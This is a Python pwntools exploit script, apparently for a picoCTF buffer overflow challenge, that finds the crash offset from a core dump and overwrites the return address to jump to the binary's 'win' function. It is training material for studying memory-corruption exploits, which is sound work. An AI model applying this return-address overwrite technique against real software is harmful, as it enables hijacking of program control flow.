from pwn import *
import os

# 1. Setup the binary
exe = './vulnerable-programs/picoctf-bof1/vuln'
elf = ELF(exe)
context.binary = elf
context.log_level = 'info'

def get_offset():
    """
    Automates the process of finding the crash offset.
    1. Runs the process
    2. Crashes it with a cyclic pattern
    3. Reads the core dump to find EIP
    """
    log.info("STEP 1: Crashing binary to find offset...")
    
    # Start a throw-away process
    io = process(exe)
    
    # Send a pattern large enough to crash it (128 bytes is plenty for a 32-byte buffer)
    io.sendline(cyclic(128))
    
    # Wait for the crash to finish writing the core file
    io.wait()
    
    # Load the core dump. Pwntools automatically finds the newest core file.
    # Note: If this fails, ensure you ran 'ulimit -c unlimited'
    core = io.corefile
    
    # In 32-bit, the instruction pointer is EIP. 
    # We ask: "Where in the cyclic pattern is the value that ended up in EIP?"
    offset = cyclic_find(core.eip)
    
    log.success(f"Offset found: {offset}")
    
    # Optional: Clean up the core file to keep your folder clean
    if os.path.exists(core.file.name):
        os.remove(core.file.name)
        
    return offset

# --- MAIN EXPLOIT ---

# 1. Get the offset dynamically
offset = get_offset()

# 2. Start the real target process
p = process(exe)

# 3. Build the payload
# flat() is a helper that pads up to 'offset' automatically
# and packs the 'win' address correctly for 32-bit (p32)
payload = flat({
    offset: elf.symbols['win']
})

log.info(f"Sending payload to jump to {hex(elf.symbols['win'])}")
p.sendline(payload)

# 4. Win
p.interactive()